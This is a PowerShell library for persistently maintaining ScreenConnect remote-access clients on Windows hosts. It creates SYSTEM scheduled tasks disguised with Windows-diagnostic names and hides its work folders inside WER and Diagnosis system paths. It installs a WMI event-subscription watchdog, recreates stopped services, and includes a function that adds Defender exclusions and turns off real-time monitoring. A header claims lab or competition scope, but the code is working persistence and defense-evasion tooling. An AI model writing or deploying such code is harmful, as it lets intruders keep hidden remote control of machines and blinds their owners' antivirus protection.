#Requires -Version 5.1
# ═══════════════════════════════════════════════════════════════
# OWN_LIB  BUILD 20260804L50
# L50: sevrz-only keepers/tasks/state/MSI helpers.
# Shared library: per-host identity, WMI watchdog, campaign state, SC repair.
# Authorized internal deployment - lab/competition scope only.
# ═══════════════════════════════════════════════════════════════
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'tasks-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate', 'test-msi', 'protect-msi', 'verify-update', 'sync-sevrz-fp')]
    [string]$Action,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$MonPath = '',
    [string]$Build  = 'O15',
    [string]$Extra  = '',
    [string]$Fp     = '',
    [switch]$Deep,
    [switch]$Force,
    [switch]$NoWait
)

$ErrorActionPreference = 'SilentlyContinue'
$cfgPath = Join-Path $WorkDir 'identity.cfg'
$IdentVersion = 8

# Root-level names WITHOUT leading backslash (matches working WucacheOwn style).
$Pools = @{
    A = @('WerQueueSync','DiagHostCache','NetTraceCache','WdiHostProxy','PlaServerHealth','TcpIpConflictRes','SrCacheSync','ResolutionQueue')
    B = @('PlaServerHealth','WdiHostProxy','WerQueueSync','NetTraceCache','DiagHostCache','TcpIpConflictRes','PlaServerDiag','SrCacheSync')
    C = @('ResolutionQueue','NetTraceCache','TcpIpConflictRes','WerQueueSync','PlaServerHealth','DiagHostCache','PlaServerDiag','WdiHostProxy')
    D = @('TcpIpConflictRes','ResolutionQueue','NetTraceCache','DiagHostCache','PlaServerDiag','WerQueueSync','PlaServerHealth','WdiHostProxy')
}
$Defaults = [ordered]@{
    TASK_A = 'WerQueueSync'
    TASK_B = 'PlaServerHealth'
    TASK_C = 'WdiHostProxy'
    TASK_D = 'TcpIpConflictRes'
    MO_A   = '2'
    MO_B   = '3'
}

function Get-HostSeed {
    $s = 0L
    foreach ($c in $env:COMPUTERNAME.ToUpper().ToCharArray()) { $s = ($s * 31 + [int]$c) % 1000000007 }
    return $s
}

function Read-Identity {
    $id = $Defaults.Clone()
    if (Test-Path $cfgPath) {
        foreach ($line in (Get-Content -LiteralPath $cfgPath -Force)) {
            if ($line -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $id[$matches[1]] = $matches[2] }
        }
    }
    return $id
}

function Remove-TaskQuiet([string]$tn) {
    if ($tn) { & schtasks.exe /Delete /TN $tn /F 2>&1 | Out-Null }
}

function Get-TaskVerboseBlob([string]$tn) {
    if (-not $tn) { return '' }
    $out = & schtasks.exe /Query /TN $tn /FO LIST /V 2>$null
    if ($LASTEXITCODE -ne 0 -or -not $out) { return '' }
    return (($out | ForEach-Object { "$_" }) -join "`n")
}

function Test-TaskOwnsMon([string]$tn, [string]$marker) {
    # True only if the scheduled action points at OUR mon/etl path — not a Windows COM handler.
    $blob = Get-TaskVerboseBlob $tn
    if (-not $blob) { return $false }
    if ($marker -and ($blob -match [regex]::Escape($marker))) { return $true }
    if ($blob -match '(?i)\.wucache\\|own_mon\.cmd|etl_mon\.cmd|\.etlcache\\') { return $true }
    return $false
}

function Initialize-Identity {
    # Idempotent within an IDENTVER generation. Pool upgrades bump IDENTVER:
    # owned old-name tasks are deleted; Windows built-ins with same name are left alone.
    if (Test-Path $cfgPath) {
        $old = Read-Identity
        # L7: also regenerate if any TASK_* is empty (L4-L6 modulo/cast bugs left blank slots)
        $slotsOk = ($old['IDENTVER'] -eq "$IdentVersion") -and $old['TASK_A'] -and $old['TASK_B'] -and $old['TASK_C'] -and $old['TASK_D']
        if ($slotsOk) { return $old }
        foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
            $tn = [string]$old[$k]
            if (-not $tn) { continue }
            # Never delete a real Windows task we never owned (TR is COM/custom handler).
            if (Test-TaskOwnsMon $tn '') { Remove-TaskQuiet $tn }
        }
        Remove-Item -LiteralPath $cfgPath -Force
    }
    $s = Get-HostSeed
    # L4: two slots may hash to the same task path (pools share names) ->
    # one physical task then satisfies two slots and the fleet shows 3/4.
    # Walk each pool forward until the pick is unique across slots.
    # L6: the old @(@('A', $s % 8), ...) form was double-broken in PS 5.1:
    # bare % inside @() parses as the ForEach-Object alias (not modulo), so the
    # collection collapsed and the loop never ran -> identity.cfg had EMPTY
    # TASK_* and the whole fleet fell back to identical default task names.
    $seeds = [ordered]@{
        A = ($s % 8)
        B = (($s + 3) % 8)
        C = (($s + 5) % 8)
        D = (($s + 7) % 8)
    }
    $pick = [ordered]@{}
    foreach ($letter in 'A','B','C','D') {
        $i = [int]$seeds[$letter]
        $name = $Pools[$letter][$i]
        $n = 0
        while ($pick.Values -contains $name -and $n -lt 8) { $i = ($i + 1) % 8; $name = $Pools[$letter][$i]; $n++ }
        if (-not $name) { $name = $Defaults["TASK_$letter"] }
        $pick[$letter] = $name
    }
    $cfg = @(
        "TASK_A=$($pick.A)"
        "TASK_B=$($pick.B)"
        "TASK_C=$($pick.C)"
        "TASK_D=$($pick.D)"
        "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
        "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
        "SEED=$s"
        "IDENTVER=$IdentVersion"
    )
    Set-Content -LiteralPath $cfgPath -Value $cfg -Force
    return (Read-Identity)
}

function Normalize-TaskName([string]$tn) {
    if (-not $tn) { return '' }
    return $tn.Trim().TrimStart('\')
}

function Write-OwnLog([string]$m) {
    $log = Join-Path $WorkDir 'boot.err'
    try { Add-Content -LiteralPath $log -Value $m -Force } catch {}
}

function Ensure-PersistTasks {
    # Mirror working detach (WucacheOwn): cmd schtasks, BOOT TR path, /ST on MINUTE.
    $id = Initialize-Identity
    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
    $boot = Join-Path $env:SystemRoot 'Temp\.wucache'
    $etlDir = 'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache'
    foreach ($d in @($boot, $etlDir)) {
        if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
    }
    $bootMon = Join-Path $boot 'own_mon.cmd'
    $bootEtl = Join-Path $boot 'etl_mon.cmd'
    $etlMon = Join-Path $etlDir 'etl_mon.cmd'
    if (Test-Path -LiteralPath $MonPath) {
        Copy-Item -LiteralPath $MonPath -Destination $bootMon -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $MonPath -Destination $bootEtl -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $MonPath -Destination $etlMon -Force -ErrorAction SilentlyContinue
    }
    # BOOT is not LockDir'd by own_secure — Task Scheduler can resolve TR there.
    $trMon = "cmd.exe /c $bootMon"
    $trEtl = "cmd.exe /c $bootEtl"
    $moA = [string]$id['MO_A']; if (-not $moA) { $moA = '2' }
    $moB = [string]$id['MO_B']; if (-not $moB) { $moB = '3' }
    $st = (Get-Date).ToString('HH:mm')
    $specs = @(
        @{ Key = 'TASK_A'; Marker = 'own_mon.cmd'; Sc = 'MINUTE'; Mo = $moA; Tr = $trMon }
        @{ Key = 'TASK_B'; Marker = 'etl_mon.cmd'; Sc = 'MINUTE'; Mo = $moB; Tr = $trEtl }
        @{ Key = 'TASK_C'; Marker = 'own_mon.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = $trMon }
        @{ Key = 'TASK_D'; Marker = 'own_mon.cmd'; Sc = 'ONLOGON'; Mo = ''; Tr = $trMon }
    )
    $ok = 0; $rearmed = 0; $fail = 0
    foreach ($sp in $specs) {
        $tn = Normalize-TaskName ([string]$id[$sp.Key])
        if (-not $tn) { $fail++; continue }
        if (Test-TaskOwnsMon $tn $sp.Marker) { $ok++; continue }
        if (Test-TaskOwnsMon ("\$tn") $sp.Marker) { $ok++; continue }
        $blob = Get-TaskVerboseBlob $tn
        if (-not $blob) { $blob = Get-TaskVerboseBlob ("\$tn") }
        if ($blob) {
            $oursBroken = ($blob -match '(?i)own_mon\.cmd|etl_mon\.cmd|\.wucache\\|\.etlcache\\')
            if (-not $oursBroken) { $fail++; Write-OwnLog "tasks_skip_foreign $tn"; continue }
            Remove-TaskQuiet $tn
            Remove-TaskQuiet ("\$tn")
        }
        # Build cmdline exactly like own.cmd detach (proven to work as SYSTEM).
        $parts = @(
            '/Create', '/TN', $tn, '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/F',
            '/TR', $sp.Tr, '/SC', $sp.Sc
        )
        if ($sp.Sc -eq 'MINUTE') {
            $parts += @('/MO', $sp.Mo, '/ST', $st)
        }
        $argLine = ($parts | ForEach-Object {
            if ($_ -match '[\s"]') { '"{0}"' -f ($_ -replace '"', '\"') } else { $_ }
        }) -join ' '
        $createTxt = cmd.exe /c "schtasks.exe $argLine" 2>&1 | ForEach-Object { "$_" }
        $createJoined = ($createTxt -join ' ').Trim()
        Write-OwnLog "tasks_create $($sp.Key) $tn => $createJoined"
        if ((Test-TaskOwnsMon $tn $sp.Marker) -or (Test-TaskOwnsMon ("\$tn") $sp.Marker)) {
            $rearmed++
            if ($sp.Key -eq 'TASK_A' -or $sp.Key -eq 'TASK_B') {
                cmd.exe /c "schtasks.exe /Run /TN `"$tn`"" | Out-Null
            }
        } else {
            $fail++
            Write-OwnLog "tasks_create_FAIL $($sp.Key) $tn"
        }
    }
    return "tasks ok=$ok rearmed=$rearmed fail=$fail"
}

function Remove-Watchdog {
    foreach ($cls in @('__FilterToConsumerBinding','__EventFilter','CommandLineEventConsumer','__IntervalTimerInstruction')) {
        Get-WmiObject -Namespace root\subscription -Class $cls -ErrorAction SilentlyContinue |
            Where-Object {
                ($_.Name -eq 'WucacheWatchdogF') -or ($_.Name -eq 'WucacheWatchdogC') -or
                ($_.TimerId -eq 'WucacheWatchdog') -or
                ($_.Filter -and $_.Filter.ToString() -like '*WucacheWatchdogF*') -or
                ($_.Consumer -and $_.Consumer.ToString() -like '*WucacheWatchdogC*')
            } | ForEach-Object { $_.Delete() | Out-Null }
    }
}

function Install-Watchdog {
    if (-not $MonPath) { return $false }
    Remove-Watchdog
    $ok = $true
    try {
        Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
            -Arguments @{ TimerId = 'WucacheWatchdog'; IntervalMilliseconds = 180000; SkipIfPassed = $false } | Out-Null
        $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
            -Arguments @{ Name = 'WucacheWatchdogF'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL';
                          Query = "SELECT * FROM __TimerEvent WHERE TimerId='WucacheWatchdog'" }
        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
            -Arguments @{ Name = 'WucacheWatchdogC'; CommandLineTemplate = "cmd.exe /c `"$MonPath`""; RunInteractively = $false }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
    } catch { $ok = $false }
    return $ok
}

function Test-WatchdogGraph {
    $t = Get-WmiObject -Namespace root\subscription -Class __IntervalTimerInstruction -Filter "TimerId='WucacheWatchdog'" -ErrorAction SilentlyContinue
    $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WucacheWatchdogF'" -ErrorAction SilentlyContinue
    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
    $b = $null
    if ($f -and $c) {
        $b = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like '*WucacheWatchdogF*' -and $_.Consumer -like '*WucacheWatchdogC*' } |
            Select-Object -First 1
    }
    return [bool]($t -and $f -and $c -and $b)
}

function Ensure-Watchdog {
    if (Test-WatchdogGraph) { return 'OK' }
    if (-not $MonPath) { return 'MISSING' }
    if (Install-Watchdog) { return 'REARMED' }
    return 'FAIL'
}

# Correct 32-bit + 64-bit ARP hives. L6 and earlier used a truncated
# WOW6432Node path (missing Microsoft\Windows) so EVERY 32-bit SC product
# was invisible to repair/exterminate/registered.
$script:UninstallRoots = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
)

function Test-SCRegistered([string]$Fingerprint) {
    # L8: NEVER use return inside ForEach-Object - it only exits the
    # pipeline iteration, so this function always fell through to 'no'
    # and the mon orphan-ladder deleted healthy registered services.
    if (-not $Fingerprint) { return 'no' }
    $name = "ScreenConnect Client ($Fingerprint)"
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { return 'yes' }
        }
    }
    return 'no'
}

function Repair-SCService([string]$Fingerprint) {
    # L30: NEVER run msiexec /fa or /i on a ScreenConnect product — SC instances share
    # legacy UpgradeCodes, so any msiexec repair/install on one FP triggers a
    # major-upgrade removal that knocks sibling ScreenConnect OFFLINE. Service-level heal only.
    if (-not $Fingerprint) { return 'no-fp' }
    $name = "ScreenConnect Client ($Fingerprint)"
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return 'svc-running' }
    if ($svc) {
        # present but stopped -> service-level start, no msiexec
        & sc.exe config "$name" start= auto 2>&1 | Out-Null
        & sc.exe failure "$name" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
        & sc.exe start "$name" 2>&1 | Out-Null
        Start-Sleep -Seconds 6
        & sc.exe start "$name" 2>&1 | Out-Null
        $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
        if ($svc -and $svc.Status -eq 'Running') { return 'svc-started' }
        return 'svc-still-stopped-norepair(msiexec-disabled)'
    }
    # service entry gone: re-create from the registered product's install dir WITHOUT msiexec.
    # If binaries exist, sc.exe create + start. Else report so caller can decide (never /fa, never /i).
    $dir = $null
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        $cand = Join-Path $base "ScreenConnect Client ($Fingerprint)"
        if (Test-Path -LiteralPath (Join-Path $cand 'ScreenConnect.ClientService.exe')) { $dir = $cand; break }
    }
    if (-not $dir) { return 'not-registered-norepair(msiexec-disabled)' }
    $exe = Join-Path $dir 'ScreenConnect.ClientService.exe'
    & sc.exe create "$name" binPath= "`"$exe`"" start= auto DisplayName= "$name" 2>&1 | Out-Null
    & sc.exe failure "$name" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
    & sc.exe start "$name" 2>&1 | Out-Null
    Start-Sleep -Seconds 5
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return 'svc-recreated-started' }
    return 'svc-recreated-not-running'
}


$script:SevrzDefaultPrimary = '5f6010579852e507'
$script:SevrzDefaultAlt = 'f861c8140d453427'
$script:SevrzKeep = @($script:SevrzDefaultPrimary, $script:SevrzDefaultAlt)

# L40: RSA public key for update.manifest verification (private key in keys/, gitignored)
$script:UpdatePubKeyXml = @'
<RSAKeyValue><Modulus>tABZPnvsupori19mtJbHoT1uFGVLNKqONB0xtvIBH4HpfM5U+StCuGnEdIyPykMQPjDElVBZOea8pddBxxPMI94d4VBpdwnQedWHlnl6EuQsJL2MMc0xo0duzpQdPVjDneIItOxVMnl4MmTSS8i15OfNTH6yddlfi6tNfTvvCtkxlL9c0qXxtIoYLQL9jC294t2O0vOsAlih0hS6XAGp8OATKR/KVPp8qfw8tzrSvKgYkpe79bJ67btjO7qTHv1JpP04xeYtCKjSFN6Xh02drtqvyuCHvw1+0HYfviaH5yNApwoNx/f5U63uMiirKuJaZMBvXM8umxykAGrqdSU0pQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
'@

function Get-SevrzCfgPath { Join-Path $WorkDir 'sevrz.cfg' }

function Get-SevrzKeep {
    $prim = $script:SevrzDefaultPrimary
    $alt = $script:SevrzDefaultAlt
    $p = Get-SevrzCfgPath
    if (Test-Path -LiteralPath $p) {
        Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_ -match '^PRIMARY_FP=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
            if ($_ -match '^ALT_FP=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
            if ($_ -match '^EXPECTED_PRIMARY=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
            if ($_ -match '^EXPECTED_ALT=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
        }
    }
    $script:SevrzKeep = @($prim, $alt)
    return @($prim, $alt)
}

function Set-SevrzFp([string]$Primary, [string]$Alt) {
    if (-not $Primary) { $Primary = $script:SevrzDefaultPrimary }
    if (-not $Alt) { $Alt = $script:SevrzDefaultAlt }
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    @(
        "PRIMARY_FP=$($Primary.ToLower())",
        "ALT_FP=$($Alt.ToLower())",
        "EXPECTED_PRIMARY=$($Primary.ToLower())",
        "EXPECTED_ALT=$($Alt.ToLower())",
        "UPDATED=$((Get-Date).ToUniversalTime().ToString('o'))"
    ) | Set-Content -LiteralPath (Get-SevrzCfgPath) -Encoding ASCII -Force
    $script:SevrzKeep = @($Primary.ToLower(), $Alt.ToLower())
}

function Sync-SevrzExpected([string]$ExpectedText) {
    $prim = $null; $alt = $null
    foreach ($line in ($ExpectedText -split "`r?`n")) {
        if ($line -match '^EXPECTED_PRIMARY=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
        if ($line -match '^EXPECTED_ALT=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
    }
    if (-not $prim) { $prim = (Get-SevrzKeep)[0] }
    if (-not $alt) { $alt = (Get-SevrzKeep)[1] }
    Set-SevrzFp $prim $alt
    return "SEVRZ|$prim|$alt"
}

function Protect-MsiSiblingSafe([string]$MsiPath) {
    if (-not $MsiPath -or -not (Test-Path -LiteralPath $MsiPath)) { return $null }
    $safe = Join-Path $env:TEMP ("sc_safe_{0}.msi" -f [guid]::NewGuid().ToString('N'))
    try {
        Copy-Item -LiteralPath $MsiPath -Destination $safe -Force
        $i = New-Object -ComObject WindowsInstaller.Installer
        $db = $i.OpenDatabase((Resolve-Path -LiteralPath $safe).Path, 1)
        try {
            $v = $db.OpenView('DELETE FROM `Upgrade`')
            $v.Execute() | Out-Null
            $db.Commit()
        } catch {
            Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue
            return $null
        }
        try {
            $db2 = $i.OpenDatabase((Resolve-Path -LiteralPath $safe).Path, 0)
            $c = $db2.OpenView('SELECT `UpgradeCode` FROM `Upgrade`')
            $c.Execute() | Out-Null
            if ($c.Fetch()) {
                Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue
                return $null
            }
        } catch {}
        return $safe
    } catch {
        if (Test-Path -LiteralPath $safe) { Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

function Test-UpdateManifest([string]$ManifestPath, [string]$SigPath, [hashtable]$FileMap) {
    if (-not (Test-Path -LiteralPath $ManifestPath) -or -not (Test-Path -LiteralPath $SigPath)) { return 'missing' }
    if (-not $script:UpdatePubKeyXml -or $script:UpdatePubKeyXml -match 'PLACEHOLDER') { return 'no-pubkey' }
    try {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $ManifestPath).Path)
        $sig = [Convert]::FromBase64String(([IO.File]::ReadAllText((Resolve-Path -LiteralPath $SigPath).Path).Trim()))
        $rsa = [System.Security.Cryptography.RSA]::Create()
        $rsa.FromXmlString($script:UpdatePubKeyXml)
        if (-not $rsa.VerifyData($bytes, $sig, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)) {
            return 'bad-sig'
        }
        $doc = Get-Content -LiteralPath $ManifestPath -Raw | ConvertFrom-Json
        foreach ($name in $FileMap.Keys) {
            $path = $FileMap[$name]
            if (-not (Test-Path -LiteralPath $path)) { return "missing-file:$name" }
            $want = [string]$doc.files.$name
            if (-not $want) { return "not-in-manifest:$name" }
            $sha = [System.Security.Cryptography.SHA256]::Create()
            $fs = [IO.File]::OpenRead((Resolve-Path -LiteralPath $path).Path)
            try { $hash = ([BitConverter]::ToString($sha.ComputeHash($fs))).Replace('-', '').ToLower() }
            finally { $fs.Close() }
            if ($hash -ne $want.ToLower()) { return "hash-mismatch:$name" }
        }
        return 'ok'
    } catch { return "error:$($_.Exception.Message)" }
}

function Get-KeepFingerprints { return @(Get-SevrzKeep) }

function Get-MsiProperty([string]$MsiPath, [string]$PropertyName) {
    if (-not (Test-Path -LiteralPath $MsiPath)) { return $null }
    try {
        $i = New-Object -ComObject WindowsInstaller.Installer
        $db = $i.OpenDatabase((Resolve-Path -LiteralPath $MsiPath).Path, 0)
        $v = $db.OpenView("SELECT `Value` FROM `Property` WHERE `Property`='$PropertyName'")
        $v.Execute() | Out-Null
        $r = $v.Fetch()
        if (-not $r) { return $null }
        return [string]$r.StringData(1)
    } catch { return $null }
}

function Get-FpFromProductName([string]$ProductName) {
    if ($ProductName -match '\(([0-9a-fA-F]{16})\)') { return $matches[1].ToLower() }
    return $null
}

function Test-MsiPackage([string]$Path, [string]$ExpectedFp = '') {
    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return $false }
    if ((Get-Item -LiteralPath $Path).Length -lt 500000) { return $false }
    try {
        $fs = [System.IO.File]::OpenRead((Resolve-Path -LiteralPath $Path).Path)
        $magic = New-Object byte[] 4
        $null = $fs.Read($magic, 0, 4)
        $fs.Close()
        if (-not ($magic[0] -eq 0xD0 -and $magic[1] -eq 0xCF -and $magic[2] -eq 0x11 -and $magic[3] -eq 0xE0)) { return $false }
    } catch { return $false }
    if ($ExpectedFp) {
        $fp = Get-FpFromProductName (Get-MsiProperty $Path 'ProductName')
        if (-not $fp -or $fp -ne $ExpectedFp.ToLower()) { return $false }
    }
    return $true
}

function Get-ScImagePath([string]$Fingerprint) {
    if (-not $Fingerprint) { return '' }
    $p = "HKLM:\SYSTEM\CurrentControlSet\Services\ScreenConnect Client ($Fingerprint)"
    try {
        return [string](Get-ItemProperty -LiteralPath $p -Name ImagePath -ErrorAction Stop).ImagePath
    } catch { return '' }
}

function Test-ScRunning([string]$Fingerprint) {
    if (-not $Fingerprint) { return $false }
    $out = & sc.exe query "ScreenConnect Client ($Fingerprint)" 2>&1 | Out-String
    return [bool]($out -match '(?i)STATE\s*:\s*\d+\s+(RUNNING|START_PENDING|CONTINUE_PENDING)')
}

function Test-ScServiceExists([string]$Fingerprint) {
    if (-not $Fingerprint) { return $false }
    & sc.exe query "ScreenConnect Client ($Fingerprint)" 2>&1 | Out-Null
    return ($LASTEXITCODE -eq 0)
}

function Add-ScDefenderExclusion([string]$Fp) {
    try {
        $names = @("ScreenConnect Client ($Fp)", 'ScreenConnect Client*')
        foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
            if (-not $base) { continue }
            foreach ($n in $names) { Add-MpPreference -ExclusionPath (Join-Path $base $n) -ErrorAction SilentlyContinue }
        }
        Add-MpPreference -ExclusionProcess 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    } catch {}
}


function Invoke-Exterminate {
    # L45/L50: HANDS-OFF — do not touch any ScreenConnect while diagnosing disconnects.
    $log = Join-Path $WorkDir 'exterminate.log'
    Add-Content -LiteralPath $log -Value ('{0} exterminate_SKIPPED_L45 hands-off-all-sc' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ErrorAction SilentlyContinue
    return 'SKIP|hands-off-sc-L45'
}

function Update-State {
    $keep = @(Get-KeepFingerprints)
    $sevrz = @(Get-SevrzKeep)
    $primFp = $sevrz[0]; $altFp = $sevrz[1]
    $prim = $null; $alt = $null
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -eq $primFp) { $prim = "$($svc.Status)" }
            elseif ($fp -eq $altFp) { $alt = "$($svc.Status)" }
        }
    }
    $foreign = @()
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin $keep) {
            $foreign += $matches[1]
        }
    }
    $id = Read-Identity
    $tasksOk = 0; $tasksTotal = 0
    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        $tn = Normalize-TaskName ([string]$id[$k])
        if (-not $tn) { continue }
        $marker = if ($k -eq 'TASK_B') { 'etl_mon.cmd' } else { 'own_mon.cmd' }
        if ((Test-TaskOwnsMon $tn $marker) -or (Test-TaskOwnsMon ("\$tn") $marker)) { $tasksOk++ }
    }
    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
    $wd = Ensure-Watchdog
    $prev = @{}
    $statePath = Join-Path $WorkDir 'state.json'
    if (Test-Path $statePath) {
        try { (Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json).PSObject.Properties | ForEach-Object { $prev[$_.Name] = $_.Value } } catch {}
    }
    $installCount = 1
    if ($prev.installCount) { $installCount = [int]$prev.installCount }
    if ($prev.prim -and $prev.prim -ne 'Running' -and $prim -eq 'Running') { $installCount++ }
    $state = [ordered]@{
        host         = $env:COMPUTERNAME
        ts           = (Get-Date).ToUniversalTime().ToString('o')
        build        = $Build
        prim         = $(if ($prim) { $prim } else { 'MISSING' })
        alt          = $(if ($alt) { $alt } else { 'MISSING' })
        foreign      = $foreign
        tasksOk      = $tasksOk
        tasksTotal   = $tasksTotal
        watchdog     = $wd
        installCount = $installCount
        lastHeal     = $(if ($Extra) { (Get-Date).ToUniversalTime().ToString('o') } elseif ($prev.lastHeal) { $prev.lastHeal } else { $null })
        note         = $Extra
    }
    ($state | ConvertTo-Json -Compress) | Set-Content -LiteralPath $statePath -Force
    return $state
}

switch ($Action) {
    'init'            { $id = Initialize-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'identity'        { $id = Read-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'watchdog'        { Install-Watchdog | Out-Null }
    'watchdog-ensure' { Ensure-Watchdog }
    'tasks-ensure'    { Ensure-PersistTasks }
    'state'           { Update-State | ConvertTo-Json -Compress }
    'repair'          { Repair-SCService $Fp }
    'registered'      { Test-SCRegistered $Fp }
    'exterminate'     { Invoke-Exterminate }
    'test-msi'        {
        $path = $Extra
        if (-not $path) { Write-Output 'no'; break }
        if (Test-MsiPackage $path $Fp) { Write-Output 'yes' } else { Write-Output 'no' }
    }
    'protect-msi'     {
        $safe = Protect-MsiSiblingSafe $Extra
        if ($safe) { Write-Output $safe } else { Write-Output 'FAIL' }
    }
    'verify-update'   {
        # Extra = "manifest|sig|name=path;name2=path2"
        $parts = $Extra -split '\|', 3
        if ($parts.Count -lt 3) { Write-Output 'bad-args'; break }
        $map = @{}
        foreach ($pair in ($parts[2] -split ';')) {
            if ($pair -match '^([^=]+)=(.*)$') { $map[$matches[1]] = $matches[2] }
        }
        Write-Output (Test-UpdateManifest $parts[0] $parts[1] $map)
    }
    'sync-sevrz-fp'   {
        if ($Extra) { Write-Output (Sync-SevrzExpected $Extra) }
        else {
            $k = @(Get-SevrzKeep)
            Write-Output ("SEVRZ|$($k[0])|$($k[1])")
        }
    }
}
